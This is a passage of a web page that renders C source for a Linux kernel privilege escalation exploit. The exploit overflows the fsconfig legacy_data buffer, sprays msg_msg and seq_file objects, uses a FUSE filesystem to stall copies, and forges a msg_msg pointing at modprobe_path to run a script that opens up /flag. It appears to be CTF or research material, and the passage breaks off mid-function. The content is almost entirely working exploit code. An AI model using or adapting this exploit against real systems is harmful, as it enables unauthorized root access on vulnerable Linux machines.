class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> 